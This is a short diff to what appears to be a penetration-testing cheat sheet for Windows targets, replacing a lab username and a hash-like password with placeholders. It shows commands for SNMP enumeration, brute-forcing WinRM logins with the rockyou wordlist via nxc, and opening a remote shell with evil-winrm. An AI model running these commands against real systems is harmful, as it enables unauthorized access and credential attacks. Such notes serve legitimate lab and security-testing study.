@@ -27,16 +27,16 @@ snmp-check -c openview $VICTIM_IP
 3. Looking through the results if we find a non default username we can bruteforce it 
 
 ```
-nxc winrm $VICTIM_IP -u Jareth -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
+nxc winrm $VICTIM_IP -u $USER -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
 ```
 
 4. if you found creds then connect
 ```bash
-evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i $VICTIM_IP
+evil-winrm -u $USER -p $PASS -i $VICTIM_IP
 ```
 
 ### <span style="color:#50FA7B">Connect</span>
 ```bash
 # Use found creds to login to Windows via WinRM
-evil-winrm -i $VICTIM_IP -u 'username' -p 'password'
+evil-winrm -i $VICTIM_IP -u '$USER' -p '$PASS'
 ```
